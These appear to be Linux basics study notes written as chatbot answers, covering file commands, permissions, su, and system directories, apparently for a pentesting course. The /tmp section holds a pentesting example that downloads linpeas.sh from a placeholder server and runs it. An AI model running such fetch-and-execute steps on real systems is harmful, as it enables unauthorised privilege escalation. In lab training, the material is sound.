

## 🔹 **Creating Files and Folders**

### `touch`

- **Purpose**: Create an empty file.
    
- **Usage**: `touch filename`
    
- **Example**:
    
    ```bash
    touch note
    ```
    
    ✅ This creates a new file named `note`.
    

---

### `mkdir` (Make Directory)

- **Purpose**: Create a new directory (folder).
    
- **Usage**: `mkdir directoryname`
    
- **Example**:
    
    ```bash
    mkdir mydirectory
    ```
    
    ✅ This creates a folder named `mydirectory`.
    

---

## 🔹 **Removing Files and Folders**

### `rm` (Remove)

- **Purpose**: Delete files.
    
- **Usage for files**: `rm filename`
    
- **Usage for directories**: `rm -R directoryname`
    
    - `-R` means **recursive**, so it deletes the folder and everything inside it.
        
- **Examples**:
    
    ```bash
    rm note         # Deletes a file named 'note'
    rm -R mydirectory  # Deletes the folder 'mydirectory' and all its contents
    ```
    

---

## 🔹 **Copying and Moving Files**

### `cp` (Copy)

- **Purpose**: Copy a file or directory.
    
- **Usage**: `cp source destination`
    
- **Example**:
    
    ```bash
    cp note note2
    ```
    
    ✅ This makes a copy of `note` and names it `note2`.
    

---

### `mv` (Move or Rename)

- **Purpose**: Move or rename files and folders.
    
- **Usage**: `mv source destination`
    
- **Examples**:
    
    ```bash
    mv note2 note3        # Renames 'note2' to 'note3'
    mv note3 folder1/     # Moves 'note3' into 'folder1'
    ```
    

---

## 🔹 **Determining File Type**

### `file`

- **Purpose**: Tells you what kind of file it is (text, image, executable, etc.)
    
- **Usage**: `file filename`
    
- **Example**:
    
    ```bash
    file note
    ```
    
    ✅ This might output:  
    `note: ASCII text`  
    This confirms it’s a plain text file, even though it has **no extension**.
    

---

## 🔹 **Key Takeaways**

- Linux doesn't require file extensions, so tools like `file` help you identify file types.
    
- `touch` creates empty files, while `mkdir` creates directories.
    
- `cp` copies, `mv` moves or renames, and `rm` deletes.
    
- Always use `rm -R` cautiously — it deletes directories **and their contents** without warning.
    

---

Would you like a quick cheat sheet or practice exercises for these commands?
---

## 🔐 **Understanding File Permissions**

When you use:

```bash
ls -lh
```

You see something like:

```
-rw-r--r-- 1 cmnatic cmnatic 0 Feb 19 10:37 file1
```

Let’s dissect the important parts.

### 🧩 File Permission Structure:

The **first 10 characters** in each line look like this:

```
-rw-r--r--
```

These represent the file type and permissions:

|Position|Meaning|Example (`-rw-r--r--`)|
|---|---|---|
|1|File type (`-` for file, `d` for directory)|`-` = file|
|2-4|**Owner's** permissions|`rw-` = read, write|
|5-7|**Group's** permissions|`r--` = read only|
|8-10|**Others'** permissions|`r--` = read only|

So `-rw-r--r--` means:

- It’s a file
    
- The owner can read & write
    
- The group can only read
    
- Everyone else can only read
    

### 👥 Ownership Columns:

Still in this line:

```
-rw-r--r-- 1 cmnatic cmnatic 0 Feb 19 10:37 file1
                   ↑       ↑
               Owner   Group
```

- The first `cmnatic` = file owner
    
- The second `cmnatic` = group that has access
    

---

## 🔁 **Switching Between Users with `su`**

### 🔑 Why Switch Users?

Sometimes:

- You need to access or edit files owned by another user
    
- You're troubleshooting as a different user
    
- You need root access for system-level tasks
    

### 👤 Using `su`:

#### Basic Switch:

```bash
su user2
```

- Prompts for `user2`’s password
    
- Keeps the **current shell environment** (you’ll still be in the current directory)
    

#### With Login Shell (`-l` or `--login`):

```bash
su -l user2
```

- Prompts for `user2`’s password
    
- Starts a **fresh shell** as if `user2` just logged in
    
- Changes to `user2`’s home directory
    
- Loads `user2`'s environment variables
    

---

## 📌 Summary

|Concept|Command or Format|Description|
|---|---|---|
|Check permissions|`ls -lh`|Shows readable file info|
|File permission flags|`-rw-r--r--`|Owner, group, others|
|File owner & group|`cmnatic cmnatic`|Who owns and what group can access|
|Switch user|`su user2`|Switch user (no login shell)|
|Switch with login shell|`su -l user2`|Full login as the new user|

---

Would you like help interpreting a specific `ls -lh` output, or maybe practicing permission changes using `chmod` or ownership changes using `chown`?

Great! You're now exploring **important system directories** in Linux, which is essential knowledge — especially for system administration, security, or penetration testing.

Here’s a **clear breakdown** of each directory you mentioned:

---

## 📁 **1. /etc – System Configuration Files**

- 📌 **Purpose**: Contains all **system-wide configuration files**.
    
- 🛠️ Examples of what's inside:
    
    - `/etc/passwd`: List of all system users.
        
    - `/etc/shadow`: Encrypted passwords for users.
        
    - `/etc/sudoers`: Defines who can use `sudo`.
        
    - `/etc/sudoers.d/`: Additional sudo permission config files.
        
- 🔐 **Access**: Typically only writable by root.
    

**Use case**:  
If you want to give a user `sudo` access, you'd edit `/etc/sudoers` using:

```bash
sudo visudo
```

---

## 📁 **2. /var – Variable Data Files**

- 📌 **Purpose**: Stores data that **changes frequently**.
    
- 🔁 Examples of subdirectories:
    
    - `/var/log`: Log files from the system and apps.
        
    - `/var/tmp`: Temp files that persist longer than `/tmp`.
        
    - `/var/backups`: System backups.
        
    - `/var/opt`: Optional software variable data.
        
- 🔍 Important in **monitoring, auditing**, or troubleshooting.
    

**Use case**:  
Check system logs:

```bash
cat /var/log/syslog
```

---

## 📁 **3. /root – Root User’s Home Directory**

- 📌 **Purpose**: This is **root’s own home directory**.
    
- 📍 Located at `/root`, not `/home/root`.
    
- 👑 Accessible **only** by the root user.
    

**Use case**:  
When you're logged in as root (or using `sudo su`), your working directory is:

```bash
/root
```

---

## 📁 **4. /tmp – Temporary Files**

- 📌 **Purpose**: Temporary storage for any user or application.
    
- ⚠️ **Volatile**: Contents are **automatically deleted** at reboot.
    
- ✍️ **World-writable**: Any user can write here.
    

**Use case in pentesting**:  
If you upload or generate files (like enumeration scripts or temporary exploits), placing them in `/tmp` is common:

```bash
cd /tmp
wget http://yourserver/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

## 🔐 Summary Table

|Directory|Meaning|Main Use|Writability|
|---|---|---|---|
|`/etc`|etcetera|System-wide configuration files|Root only|
|`/var`|variable|Logs, backups, temporary/persistent data|Varies (root/service-owned)|
|`/root`|root's home|Home directory for the root user|Root only|
|`/tmp`|temporary|Temporary files for all users|Writable by all, cleared on reboot|

---

Let me know if you'd like to test these directories in a CTF/lab context or need help interpreting something like `/etc/shadow`.